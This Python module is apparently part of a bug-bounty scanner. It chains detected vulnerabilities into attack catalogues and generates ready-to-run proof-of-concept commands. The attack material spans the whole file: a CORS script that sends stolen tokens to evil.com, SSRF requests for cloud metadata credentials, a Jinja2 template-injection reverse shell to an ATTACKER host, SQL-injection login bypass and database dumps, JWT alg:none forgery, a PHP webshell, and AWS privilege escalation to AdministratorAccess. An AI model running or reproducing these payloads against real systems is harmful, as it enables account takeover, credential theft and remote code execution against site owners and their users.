"""
BugScan ELITE — Exploitation Chain Engine
Automatically chains vulnerabilities for maximum impact PoCs.
e.g. CORS + Auth endpoint → steal token → IDOR → data exfil
"""
import json, time, logging, re, urllib.request, urllib.parse, ssl
from typing import List, Dict, Optional, Tuple

log = logging.getLogger("elite.chain")

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c

def _req(url, method="GET", headers=None, data=None, timeout=10):
    try:
        h = {"User-Agent": "Mozilla/5.0 BugScanELITE/1.0",
             "Accept": "application/json, text/html, */*"}
        if headers: h.update(headers)
        req = urllib.request.Request(url, data=data, headers=h, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            body = r.read(16384).decode("utf-8","ignore")
            return r.status, dict(r.headers), body
    except urllib.error.HTTPError as e:
        try: return e.code, dict(e.headers), e.read(2048).decode("utf-8","ignore")
        except: return e.code, {}, ""
    except: return None

# ── Chain definitions ─────────────────────────────────────────────────────────
# Each chain: {name, requires, steps, severity, impact}

CHAIN_CATALOG = [

    {
        "id":       "cors_token_steal",
        "name":     "CORS → Token Theft → Account Takeover",
        "requires": ["cors", "oauth"],
        "severity": "critical",
        "impact":   "Full account takeover via stolen authentication token",
        "steps": [
            "1. CORS misconfiguration allows arbitrary origin",
            "2. OAuth/auth endpoint returns bearer token in response",
            "3. Attacker hosts malicious page that makes cross-origin request",
            "4. Token stolen from response and used to authenticate as victim",
        ],
    },

    {
        "id":       "cors_idor_exfil",
        "name":     "CORS + IDOR → Data Exfiltration",
        "requires": ["cors", "idor"],
        "severity": "critical",
        "impact":   "Cross-origin data exfiltration of other users' data",
        "steps": [
            "1. CORS reflects attacker origin with credentials=true",
            "2. IDOR in API allows access to other user records",
            "3. Chained: attacker page fetches victim user data cross-origin",
            "4. Full data exfiltration without victim interaction beyond page visit",
        ],
    },

    {
        "id":       "subdomain_takeover_xss",
        "name":     "Subdomain Takeover → Stored XSS → Session Hijack",
        "requires": ["takeover", "xss"],
        "severity": "critical",
        "impact":   "Session hijacking via trusted subdomain XSS",
        "steps": [
            "1. Dangling CNAME points to claimable external service",
            "2. Register the service and host malicious content on subdomain",
            "3. Inject XSS payload that executes in victim's browser",
            "4. Steal session cookies from parent domain (if cookie scoped to .domain.com)",
        ],
    },

    {
        "id":       "ssrf_cloud_metadata",
        "name":     "SSRF → Cloud Metadata → IAM Credential Theft",
        "requires": ["ssrf"],
        "severity": "critical",
        "impact":   "AWS/GCP/Azure IAM credential theft → cloud account compromise",
        "steps": [
            "1. SSRF allows requests to internal/cloud metadata IPs",
            "2. Fetch http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "3. Extract AccessKeyId, SecretAccessKey, SessionToken",
            "4. Use credentials to access S3, EC2, RDS, Lambda, etc.",
        ],
    },

    {
        "id":       "sqli_auth_bypass",
        "name":     "SQLi → Authentication Bypass → Admin Access",
        "requires": ["sqli"],
        "severity": "critical",
        "impact":   "Full authentication bypass and admin panel access",
        "steps": [
            "1. SQL injection in login parameter",
            "2. Payload: ' OR '1'='1'--  bypasses password check",
            "3. Login as any user including admin",
            "4. Full application access as administrator",
        ],
    },

    {
        "id":       "lfi_log_poison_rce",
        "name":     "LFI → Log Poisoning → RCE",
        "requires": ["lfi"],
        "severity": "critical",
        "impact":   "Remote code execution via LFI log poisoning chain",
        "steps": [
            "1. LFI allows reading /var/log/apache2/access.log",
            "2. Poison log with PHP code in User-Agent: <?php system($_GET['cmd']); ?>",
            "3. Include log file via LFI: ?file=../../../../var/log/apache2/access.log",
            "4. Execute commands: ?file=...access.log&cmd=id",
        ],
    },

    {
        "id":       "xxe_ssrf_chain",
        "name":     "XXE → Internal SSRF → Data Exfil",
        "requires": ["xxe"],
        "severity": "critical",
        "impact":   "Internal network access and data exfiltration via XXE-SSRF",
        "steps": [
            "1. XXE injection in XML parsing endpoint",
            "2. Use SSRF via XXE to probe internal services",
            "3. Read internal files and service responses",
            "4. Exfiltrate via DNS/HTTP OOB channel",
        ],
    },

    {
        "id":       "ssti_rce",
        "name":     "SSTI → Remote Code Execution",
        "requires": ["ssti"],
        "severity": "critical",
        "impact":   "Full RCE via server-side template injection",
        "steps": [
            "1. SSTI confirmed: {{7*7}} → 49",
            "2. Identify engine (Jinja2/Twig/Freemarker)",
            "3. Escalate to OS command: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "4. Full shell access on server",
        ],
    },

    {
        "id":       "oauth_account_takeover",
        "name":     "OAuth Misconfiguration → Account Takeover",
        "requires": ["oauth"],
        "severity": "critical",
        "impact":   "Account takeover via OAuth redirect_uri manipulation",
        "steps": [
            "1. OAuth authorization endpoint accepts open redirect_uri",
            "2. Craft link: /oauth/authorize?client_id=X&redirect_uri=https://evil.com",
            "3. Victim clicks link, authorizes app, token sent to attacker domain",
            "4. Attacker uses token to authenticate as victim",
        ],
    },

    {
        "id":       "jwt_alg_none",
        "name":     "JWT alg:none → Privilege Escalation",
        "requires": ["jwt"],
        "severity": "critical",
        "impact":   "Authentication bypass and privilege escalation",
        "steps": [
            "1. JWT found in application responses",
            "2. Decode header: base64(header).alg = RS256",
            "3. Forge new JWT with alg:none, modified payload (role:admin)",
            "4. Server accepts unsigned token → full admin access",
        ],
    },

    {
        "id":       "actuator_env_rce",
        "name":     "Spring Actuator /env → Property Injection → RCE",
        "requires": ["actuator"],
        "severity": "critical",
        "impact":   "RCE via Spring Boot Actuator environment property injection",
        "steps": [
            "1. /actuator/env exposed and writable (POST)",
            "2. Inject spring.datasource.url with JNDI LDAP payload",
            "3. Trigger /actuator/refresh to reload properties",
            "4. JNDI lookup triggers Log4Shell-style RCE",
        ],
    },

    {
        "id":       "graphql_introspection_injection",
        "name":     "GraphQL Introspection → Schema Mapping → Injection",
        "requires": ["graphql"],
        "severity": "high",
        "impact":   "Data exfiltration via GraphQL injection after schema discovery",
        "steps": [
            "1. GraphQL introspection reveals full schema",
            "2. Identify mutations with user-controlled fields",
            "3. Inject NoSQL/SQL payloads into GraphQL arguments",
            "4. Exfiltrate data via nested query depth abuse",
        ],
    },

    {
        "id":       "saml_signature_wrapping",
        "name":     "SAML XML Signature Wrapping → Authentication Bypass",
        "requires": ["saml"],
        "severity": "critical",
        "impact":   "SSO authentication bypass → access any user's account",
        "steps": [
            "1. SAML response captured from legitimate login",
            "2. XML signature wrapping: duplicate assertion, modify username",
            "3. Original signature still valid on untampered node",
            "4. Server processes modified assertion → login as any user",
        ],
    },

    {
        "id":       "expose_to_rce",
        "name":     "Config Exposure → Credential Theft → RCE",
        "requires": ["expose"],
        "severity": "critical",
        "impact":   "RCE via credentials extracted from exposed config files",
        "steps": [
            "1. .env / config file exposed with database/API credentials",
            "2. Extract DB_PASSWORD, AWS credentials, API keys",
            "3. Use DB credentials to access database directly",
            "4. Write webshell via DB INTO OUTFILE or use cloud creds for RCE",
        ],
    },

    {
        "id":       "jsleak_to_access",
        "name":     "JS Secrets → API Access → Data Breach",
        "requires": ["jsleak"],
        "severity": "critical",
        "impact":   "Full API/cloud service access via hardcoded credentials",
        "steps": [
            "1. AWS Access Key / API key found in JavaScript bundle",
            "2. Validate key: aws sts get-caller-identity",
            "3. Enumerate accessible resources: S3, EC2, RDS, Lambda",
            "4. Exfiltrate all accessible data / escalate to full account",
        ],
    },

    {
        "id":       "idor_mass_data_leak",
        "name":     "IDOR → Mass Data Exfiltration",
        "requires": ["idor"],
        "severity": "high",
        "impact":   "Exfiltration of entire user database via IDOR",
        "steps": [
            "1. IDOR in /api/v1/users/{id} - sequential IDs",
            "2. Iterate IDs 1 to N: extract name/email/phone/address",
            "3. No rate limiting → entire database dumped",
            "4. Full PII breach reportable to data protection authorities",
        ],
    },

    {
        "id":       "fileupload_webshell",
        "name":     "File Upload → Webshell → Server Takeover",
        "requires": ["fileupload"],
        "severity": "critical",
        "impact":   "Full server compromise via uploaded webshell",
        "steps": [
            "1. File upload accepts PHP/ASPX/JSP with wrong content-type check",
            "2. Upload <?php system($_GET['cmd']); ?> as shell.php",
            "3. Access uploaded file URL directly",
            "4. Execute OS commands → reverse shell → full server access",
        ],
    },
    # New elite chains
    {
        "id": "firebase-ato",
        "name": "Firebase Exposed → Account Takeover",
        "severity": "critical",
        "requires": ["expose","oauth"],
        "description": "Open Firebase DB + OAuth token → full account takeover",
        "steps": ["Read Firebase DB for email/ID", "Use OAuth endpoint to generate token", "Access account"],
        "cvss": 9.8,
    },
    {
        "id": "elasticsearch-exfil",
        "name": "Elasticsearch → Mass Data Exfiltration",
        "severity": "critical",
        "requires": ["expose"],
        "description": "Unauth Elasticsearch exposes all indices — dump entire database",
        "steps": ["GET /_cat/indices", "GET /{index}/_search?size=10000", "Exfil all records"],
        "cvss": 9.1,
    },
    {
        "id": "oauth-ato",
        "name": "OAuth Token Leak → Account Takeover",
        "severity": "critical",
        "requires": ["jsleak","oauth"],
        "description": "Token in URL/response → use to authenticate as victim",
        "steps": ["Extract access_token from URL/source", "Call /api/me with token", "Full account access"],
        "cvss": 9.3,
    },
    {
        "id": "graphql-sqli-exfil",
        "name": "GraphQL SQLi → Database Dump",
        "severity": "critical",
        "requires": ["graphql","sqli"],
        "description": "SQLi through GraphQL resolvers — bypass WAF via JSON encoding",
        "steps": ["Inject SQL via GraphQL arg", "Extract DB schema", "Dump sensitive tables"],
        "cvss": 9.0,
    },
    {
        "id": "ssrf-redis-rce",
        "name": "SSRF → Redis → RCE",
        "severity": "critical",
        "requires": ["ssrf","expose"],
        "description": "SSRF to internal Redis → write webshell via SLAVEOF/CONFIG SET",
        "steps": ["Find SSRF point", "SSRF to 127.0.0.1:6379", "Redis CONFIG SET dir/dbfilename", "Execute webshell"],
        "cvss": 9.8,
    },
    {
        "id": "jwt-firebase-ato",
        "name": "JWT kid Injection → Firebase → ATO",
        "severity": "critical",
        "requires": ["jwt","expose"],
        "description": "JWT kid path traversal + Firebase exposure = full account control",
        "steps": ["kid=../../dev/null bypass", "Access Firebase with forged identity", "ATO"],
        "cvss": 9.5,
    },
    {
        "id": "second-order-sqli-rce",
        "name": "Second-Order SQLi → RCE via LOAD_FILE",
        "severity": "critical",
        "requires": ["sqli"],
        "description": "Stored SQLi in profile → triggers on admin view → MySQL LOAD_FILE RCE",
        "steps": ["Inject SQL in profile field", "Admin views profile", "LOAD_FILE or INTO OUTFILE executes"],
        "cvss": 9.6,
    },
    {
        "id": "parameter-mining-idor",
        "name": "Hidden Parameter → IDOR → Data Breach",
        "severity": "high",
        "requires": ["idor","expose"],
        "description": "Discover hidden admin/debug params → access other users' data",
        "steps": ["Mine hidden params", "Find user_id/account param", "Access arbitrary user data"],
        "cvss": 8.5,
    },
    {
        "id": "cswsh-session",
        "name": "CSWSH → Session Token Theft",
        "severity": "high",
        "requires": ["websocket","stored_xss"],
        "description": "Cross-site WebSocket hijacking to steal session messages",
        "steps": ["Host evil page", "WebSocket connection from victim", "Steal session data/tokens"],
        "cvss": 8.8,
    },
    {
        "id": "api-version-auth-bypass",
        "name": "Old API Version → Auth Bypass",
        "severity": "high",
        "requires": ["expose","idor"],
        "description": "v1 API lacks auth checks present in v2 — IDOR/auth bypass",
        "steps": ["Find v2 endpoint", "Test same path on v1", "Auth check missing → data access"],
        "cvss": 8.1,
    },
]




def find_chains(findings: List[Dict]) -> List[Dict]:
    """
    Given a list of findings, find all possible exploitation chains.
    Returns chain objects with PoC details.
    """
    found_bugs = set(f.get("bug","") for f in findings)
    chains = []

    for chain in CHAIN_CATALOG:
        required = set(chain["requires"])
        if required.issubset(found_bugs):
            # Find the actual finding instances
            chain_findings = {}
            for bug in required:
                matching = [f for f in findings if f.get("bug") == bug]
                if matching:
                    chain_findings[bug] = matching[0]

            # Build PoC
            poc = _build_poc(chain, chain_findings)

            chains.append({
                "id":           chain["id"],
                "name":         chain["name"],
                "severity":     chain["severity"],
                "impact":       chain.get("impact","Combined vulnerability chain"),
                "steps":        chain["steps"],
                "findings":     chain_findings,
                "poc":          poc,
                "discovered_at":time.strftime("%Y-%m-%dT%H:%M:%SZ"),
            })
            log.info(f"[chain] found: {chain['name']}")

    return chains


def _build_poc(chain: Dict, findings: Dict) -> str:
    """Build concrete PoC commands/scripts for a chain."""
    cid = chain["id"]
    poc_lines = [f"# PoC: {chain['name']}", f"# Impact: {chain.get('impact','Combined vulnerability chain')}", ""]

    if cid == "cors_token_steal":
        cors_f = findings.get("cors", {})
        oauth_f = findings.get("oauth", {})
        url = cors_f.get("url","https://target.com/api")
        origin = cors_f.get("details",{}).get("origin_tested","https://evil.com")
        poc_lines += [
            "# Step 1: Verify CORS",
            f"curl -H 'Origin: {origin}' -I '{url}'",
            "",
            "# Step 2: Steal token via malicious page",
            "<script>",
            f"  fetch('{url}', {{credentials: 'include'}})",
            "    .then(r => r.json())",
            "    .then(data => fetch('https://evil.com/steal?token=' + JSON.stringify(data)));",
            "</script>",
        ]

    elif cid == "ssrf_cloud_metadata":
        ssrf_f = findings.get("ssrf", {})
        url = ssrf_f.get("url","https://target.com/api?url=")
        param = ssrf_f.get("details",{}).get("param","url")
        poc_lines += [
            "# Step 1: Confirm SSRF",
            f"curl '{url}?{param}=http://169.254.169.254/latest/meta-data/'",
            "",
            "# Step 2: Get IAM role",
            f"curl '{url}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
            "",
            "# Step 3: Get credentials",
            f"curl '{url}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME'",
            "",
            "# Step 4: Use credentials",
            "export AWS_ACCESS_KEY_ID=ASIA...",
            "export AWS_SECRET_ACCESS_KEY=...",
            "export AWS_SESSION_TOKEN=...",
            "aws s3 ls  # List all buckets",
            "aws iam get-user  # Get current user info",
        ]

    elif cid == "sqli_auth_bypass":
        sqli_f = findings.get("sqli", {})
        url = sqli_f.get("url","https://target.com/login")
        param = sqli_f.get("details",{}).get("param","username")
        poc_lines += [
            "# Step 1: Confirm SQLi",
            f"curl -X POST '{url}' -d \"{param}=' OR '1'='1'--&password=x\"",
            "",
            "# Step 2: Login as admin",
            f"curl -X POST '{url}' -d \"{param}=admin'--&password=x\" -c cookies.txt",
            "",
            "# Step 3: Extract all users",
            f"sqlmap -u '{url}' --data='{param}=test&password=test'",
            "       --dbs --dump --batch --threads=10",
        ]

    elif cid == "ssti_rce":
        ssti_f = findings.get("ssti", {})
        url = ssti_f.get("url","https://target.com/render")
        param = ssti_f.get("details",{}).get("param","template")
        poc_lines += [
            "# Step 1: Confirm SSTI",
            f"curl '{url}?{param}={{{{7*7}}}}'  # Should return 49",
            "",
            "# Step 2: Jinja2 RCE",
            f"curl '{url}?{param}={{{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}}}'",
            "",
            "# Step 3: Reverse shell",
            "PAYLOAD=\"{{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/ATTACKER/4444 0>&1').read()}}\"",
            f"curl '{url}?{param}=${{PAYLOAD}}'",
        ]

    elif cid == "jwt_alg_none":
        jwt_f = findings.get("jwt", {})
        url = jwt_f.get("url","https://target.com")
        poc_lines += [
            "# Step 1: Decode original JWT",
            "pip3 install pyjwt",
            "python3 -c \"import base64,json; tok='PASTE_JWT_HERE'; parts=tok.split('.');",
            "  print(json.loads(base64.urlsafe_b64decode(parts[1]+'==')))\"",
            "",
            "# Step 2: Forge admin token",
            "python3 << 'EOF'",
            "import base64, json",
            "header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')",
            "payload = base64.urlsafe_b64encode(json.dumps({'sub':'1','role':'admin','exp':9999999999}).encode()).rstrip(b'=')",
            "forged = header.decode() + '.' + payload.decode() + '.'",
            "print('Forged JWT:', forged)",
            "EOF",
            "",
            "# Step 3: Use forged token",
            f"curl -H 'Authorization: Bearer FORGED_JWT' '{url}/api/admin'",
        ]

    elif cid == "actuator_env_rce":
        act_f = findings.get("actuator", {})
        url = act_f.get("url","https://target.com")
        base = url.rstrip("/")
        poc_lines += [
            "# Step 1: Verify /actuator/env readable",
            f"curl '{base}/actuator/env'",
            "",
            "# Step 2: Inject malicious property via POST",
            f"curl -X POST '{base}/actuator/env' \\",
            "  -H 'Content-Type: application/json' \\",
            "  -d '{\"name\":\"spring.datasource.url\",\"value\":\"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '\\''http://evil.com/inject.sql'\\''\"}' ",
            "",
            "# Step 3: Trigger refresh",
            f"curl -X POST '{base}/actuator/refresh'",
            "",
            "# Step 4: Alternative — heapdump for password extraction",
            f"curl '{base}/actuator/heapdump' -o heap.hprof",
            "strings heap.hprof | grep -i password",
        ]

    elif cid == "jsleak_to_access":
        js_f = findings.get("jsleak", {})
        secret_type = js_f.get("details",{}).get("secret_type","AWS Access Key")
        preview = js_f.get("details",{}).get("preview","AKIA...")
        poc_lines += [
            f"# Found: {secret_type}",
            f"# Value: {preview}",
            "",
            "# Step 1: Validate AWS key",
            "export AWS_ACCESS_KEY_ID='FOUND_KEY'",
            "export AWS_SECRET_ACCESS_KEY='FOUND_SECRET'",
            "aws sts get-caller-identity",
            "",
            "# Step 2: Enumerate permissions",
            "aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)",
            "aws s3 ls  # List buckets",
            "aws ec2 describe-instances --region us-east-1",
            "",
            "# Step 3: Escalate",
            "aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --user-name TARGET",
        ]

    else:
        # Generic PoC
        poc_lines += [
            "# See steps above for manual exploitation",
            "# Combine the individual finding PoCs:",
        ]
        for bug, f in findings.items():
            poc_lines.append(f"#   {bug}: {f.get('url','')}")

    return "\n".join(poc_lines)


def auto_verify_ssrf(url: str, param: str) -> Optional[Dict]:
    """Actively verify SSRF by fetching AWS metadata."""
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/",
        "http://[::ffff:169.254.169.254]/",
        "http://0251.0376.0251.0376/",  # octal
        "http://2852039166/",            # decimal
    ]
    try:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        for payload in payloads:
            nq = dict(qs)
            nq[param] = [payload]
            test = urllib.parse.urlunparse(parsed._replace(
                query=urllib.parse.urlencode(nq, doseq=True)))
            r = _req(test, timeout=8)
            if r and r[0] == 200:
                if any(s in r[2] for s in ["ami-id","instance-id","hostname","local-ipv4"]):
                    return {
                        "confirmed": True,
                        "payload": payload,
                        "response": r[2][:500],
                        "severity": "critical",
                    }
    except: pass
    return None

def detect_chains(findings: list, domain: str = "") -> list:
    """Alias for find_chains — detect exploit chains from findings."""
    return find_chains(findings)
